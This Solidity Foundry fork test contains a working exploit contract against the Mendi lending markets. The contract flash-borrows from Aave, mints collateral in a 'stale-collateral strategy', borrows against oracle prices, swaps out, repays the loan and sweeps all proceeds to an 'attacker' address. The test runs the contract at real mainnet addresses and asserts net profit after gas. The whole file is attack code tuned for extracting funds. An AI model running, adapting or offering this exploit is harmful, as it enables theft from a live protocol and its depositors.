// SPDX-License-Identifier: BSD-3-Clause
pragma solidity ^0.8.10;

import { Test, console2 } from "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function mint(uint256 amount) external returns (uint256);
    function borrow(uint256 amount) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function markets(address cToken) external view returns (bool isListed, uint256 collateralFactorMantissa, bool isComped);
    function oracle() external view returns (address);
}

interface IPriceOracleLike {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IAavePoolLike {
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ISwapRouter02Like {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract MendiCandidateFlashBorrower {
    address public immutable attacker;
    IAavePoolLike public immutable aavePool;
    ISwapRouter02Like public immutable router;
    IERC20Like public immutable flashToken;
    IERC20Like public immutable collateralToken;
    IERC20Like public immutable debtToken;
    ICTokenLike public immutable collateralCToken;
    ICTokenLike public immutable debtCToken;
    uint256 public immutable flashAmount;
    uint256 public immutable borrowAmount;
    uint24 public immutable buyFee;
    uint24 public immutable exitFee;

    uint256 public lastCollateralReceived;
    uint256 public lastDebtReceived;
    uint256 public lastFlashPremium;
    uint256 public lastFlashRepayment;

    event CandidateExecuted(
        uint256 collateralReceived,
        uint256 debtReceived,
        uint256 flashRepayment,
        uint256 residualCollateralCTokens,
        uint256 residualDebt
    );

    modifier onlyAttacker() {
        require(msg.sender == attacker, "only attacker");
        _;
    }

    constructor(
        address attacker_,
        address aavePool_,
        address router_,
        address flashToken_,
        address collateralCToken_,
        address debtCToken_,
        uint256 flashAmount_,
        uint256 borrowAmount_,
        uint24 buyFee_,
        uint24 exitFee_
    ) {
        attacker = attacker_;
        aavePool = IAavePoolLike(aavePool_);
        router = ISwapRouter02Like(router_);
        flashToken = IERC20Like(flashToken_);
        collateralCToken = ICTokenLike(collateralCToken_);
        debtCToken = ICTokenLike(debtCToken_);
        collateralToken = IERC20Like(ICTokenLike(collateralCToken_).underlying());
        debtToken = IERC20Like(ICTokenLike(debtCToken_).underlying());
        flashAmount = flashAmount_;
        borrowAmount = borrowAmount_;
        buyFee = buyFee_;
        exitFee = exitFee_;
        require(collateralCToken.comptroller() == debtCToken.comptroller(), "comptroller mismatch");
    }

    function execute() external onlyAttacker {
        aavePool.flashLoanSimple(address(this), address(flashToken), flashAmount, "", 0);
        _sweep(flashToken);
        _sweep(debtToken);
        _sweep(collateralToken);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(aavePool), "wrong Aave caller");
        require(initiator == address(this), "wrong flash initiator");
        require(asset == address(flashToken) && amount == flashAmount, "unexpected flash asset/amount");

        uint256 collateralReceived;
        if (address(flashToken) == address(collateralToken)) {
            // Direct stale-collateral strategy: no acquisition swap and no buy-side slippage.
            collateralReceived = flashAmount;
        } else {
            _swap(address(flashToken), address(collateralToken), flashAmount, buyFee);
            collateralReceived = collateralToken.balanceOf(address(this));
        }
        require(collateralReceived != 0, "no collateral received");

        address[] memory markets = new address[](1);
        markets[0] = address(collateralCToken);
        uint256[] memory enterResults = IComptrollerLike(collateralCToken.comptroller()).enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enter market failed");
        require(collateralToken.approve(address(collateralCToken), collateralReceived), "mint approval failed");
        require(collateralCToken.mint(collateralReceived) == 0, "collateral mint failed");
        uint256 actualBorrowAmount = borrowAmount == 0 ? this.autoBorrowAmount(collateralReceived) : borrowAmount;
        require(debtCToken.borrow(actualBorrowAmount) == 0, "debt borrow failed");

        uint256 debtReceived = debtToken.balanceOf(address(this));
        if (address(debtToken) != address(flashToken)) {
            _swap(address(debtToken), address(flashToken), debtReceived, exitFee);
        }

        uint256 repayment = amount + premium;
        require(flashToken.balanceOf(address(this)) >= repayment, "flash repayment shortfall");
        require(flashToken.approve(address(aavePool), repayment), "Aave repay approval failed");
        lastCollateralReceived = collateralReceived;
        lastDebtReceived = debtReceived;
        lastFlashPremium = premium;
        lastFlashRepayment = repayment;
        emit CandidateExecuted(
            collateralReceived,
            debtReceived,
            repayment,
            collateralCToken.balanceOf(address(this)),
            debtCToken.borrowBalanceStored(address(this))
        );
        return true;
    }

    function autoBorrowAmount(uint256 collateralReceived) external view returns (uint256) {
        IComptrollerLike comptroller = IComptrollerLike(collateralCToken.comptroller());
        (, uint256 collateralFactor,) = comptroller.markets(address(collateralCToken));
        IPriceOracleLike oracle = IPriceOracleLike(comptroller.oracle());
        uint256 collateralPrice = oracle.getUnderlyingPrice(address(collateralCToken));
        uint256 debtPrice = oracle.getUnderlyingPrice(address(debtCToken));
        uint256 collateralUsd = (collateralReceived * collateralPrice) / 1e18;
        uint256 weightedUsd = (collateralUsd * collateralFactor) / 1e18;
        // 1% buffer avoids rounding into an insufficient-liquidity revert.
        return (((weightedUsd * 1e18) / debtPrice) * 99) / 100;
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn, uint24 fee) internal {
        require(IERC20Like(tokenIn).approve(address(router), amountIn), "swap approval failed");
        ISwapRouter02Like.ExactInputSingleParams memory params = ISwapRouter02Like.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: fee,
            recipient: address(this),
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        router.exactInputSingle(params);
    }

    function _sweep(IERC20Like token) internal {
        uint256 balance = token.balanceOf(address(this));
        if (balance != 0) require(token.transfer(attacker, balance), "sweep failed");
    }
}

contract MendiStaleCollateralForkTest is Test {
    uint256 internal diagnosticSeedFlash;
    address internal flashToken;
    address internal collateralCToken;
    address internal debtCToken;
    address internal flashCTokenForGas;
    uint256 internal flashAmount;
    uint256 internal borrowAmount;
    uint256 internal buyFee;
    uint256 internal exitFee;
    bool internal requireProfit;
    bool internal expectRevert;
    int256 internal minimumFlashNet;

    address internal constant AAVE_POOL = 0xc47b8C00b0f69a36fa203Ffeac0334874574a8Ac;
    address internal constant SWAP_ROUTER = 0x3d4e44Eb1374240CE5F1B871ab261CD16335B76a;
    address internal constant WBTC = 0x3aAB2285ddcDdaD8edf438C1bAB47e1a9D05a9b4;
    address internal constant ME_WBTC = 0x9be5e24F05bBAfC28Da814bD59284878b388a40f;
    address internal constant ME_WETH = 0xAd7f33984bed10518012013D4aB0458D37FEE6F3;

    function testForkCandidate_flashMintBorrowExitRepayAndMeasureNet() public {
        string memory rpc = vm.envString("RPC_URL");
        uint256 blockNumber = vm.envUint("BLOCK");
        vm.createSelectFork(rpc, blockNumber);
        _configure();

        address debtToken = ICTokenLike(debtCToken).underlying();
        MendiCandidateFlashBorrower borrower = new MendiCandidateFlashBorrower(
            address(this),
            AAVE_POOL,
            SWAP_ROUTER,
            flashToken,
            collateralCToken,
            debtCToken,
            flashAmount,
            borrowAmount,
            uint24(buyFee),
            uint24(exitFee)
        );

        _seedDiagnostic(address(borrower));
        uint256 initialFlash = IERC20Like(flashToken).balanceOf(address(this)) + diagnosticSeedFlash;
        uint256 initialDebt = IERC20Like(debtToken).balanceOf(address(this));
        if (expectRevert) vm.expectRevert();
        borrower.execute();
        if (expectRevert) {
            console2.log("expected revert observed; no profit claim");
            return;
        }
        uint256 finalFlash = IERC20Like(flashToken).balanceOf(address(this));
        uint256 finalDebt = IERC20Like(debtToken).balanceOf(address(this));
        int256 flashNet = int256(finalFlash) - int256(initialFlash);
        int256 debtNet = int256(finalDebt) - int256(initialDebt);

        console2.log("diagnostic flash seed excluded from P&L", diagnosticSeedFlash);
        console2.log("flash token liquid net before gas", flashNet);
        console2.log("debt token liquid net before gas", debtNet);
        console2.log("collateral received", borrower.lastCollateralReceived());
        console2.log("debt received", borrower.lastDebtReceived());
        console2.log("Aave premium bps", IAavePoolLike(AAVE_POOL).FLASHLOAN_PREMIUM_TOTAL());
        console2.log("Aave premium paid", borrower.lastFlashPremium());
        console2.log("Aave principal plus premium repaid", borrower.lastFlashRepayment());
        console2.log("residual collateral cTokens", ICTokenLike(collateralCToken).balanceOf(address(borrower)));
        console2.log("residual borrow balance", ICTokenLike(debtCToken).borrowBalanceStored(address(borrower)));
        console2.log("residual collateral/debt are not counted as liquid profit");
        _logGasReserveAndAssert(initialFlash);
    }

    function _configure() internal {
        flashToken = vm.envOr("FLASH_TOKEN", WBTC);
        collateralCToken = vm.envOr("COLLATERAL_CTOKEN", ME_WBTC);
        debtCToken = vm.envOr("DEBT_CTOKEN", ME_WETH);
        flashCTokenForGas = vm.envOr("FLASH_CTOKEN", collateralCToken);
        flashAmount = vm.envOr("FLASH_AMOUNT", uint256(1_000_000));
        borrowAmount = vm.envOr("BORROW_AMOUNT", uint256(0));
        buyFee = vm.envOr("BUY_FEE", uint256(500));
        exitFee = vm.envOr("EXIT_FEE", uint256(500));
        require(buyFee <= type(uint24).max && exitFee <= type(uint24).max, "invalid fee tier");
        requireProfit = vm.envOr("REQUIRE_PROFIT", true);
        expectRevert = vm.envOr("EXPECT_REVERT", false);
        minimumFlashNet = vm.envOr("MIN_FLASH_NET", int256(0));
    }

    function _logGasReserveAndAssert(uint256 initialFlash) internal {
        uint256 gasReserveFlash = _gasReserveFlash();
        int256 flashNet = int256(IERC20Like(flashToken).balanceOf(address(this))) - int256(initialFlash);
        int256 flashNetAfterGasReserve = flashNet - int256(gasReserveFlash);
        console2.log("gas reserve in flash token", gasReserveFlash);
        console2.log("flash token liquid net after gas reserve", flashNetAfterGasReserve);
        if (requireProfit) assertTrue(flashNetAfterGasReserve > minimumFlashNet, "candidate did not exceed minimum liquid net after gas reserve");
    }

    function _gasReserveFlash() internal view returns (uint256) {
        uint256 gasReserveWei = vm.envOr("GAS_RESERVE_WEI", uint256(1e15));
        address comptroller = ICTokenLike(flashCTokenForGas).comptroller();
        address oracle = IComptrollerLike(comptroller).oracle();
        uint256 flashPrice = IPriceOracleLike(oracle).getUnderlyingPrice(flashCTokenForGas);
        uint256 wethPrice = IPriceOracleLike(oracle).getUnderlyingPrice(ME_WETH);
        return (gasReserveWei * wethPrice) / flashPrice;
    }

    function _seedDiagnostic(address borrower) internal {
        diagnosticSeedFlash = vm.envOr("SEED_FLASH_AMOUNT", uint256(0));
        if (diagnosticSeedFlash != 0) {
            deal(flashToken, borrower, diagnosticSeedFlash);
        }
    }
}
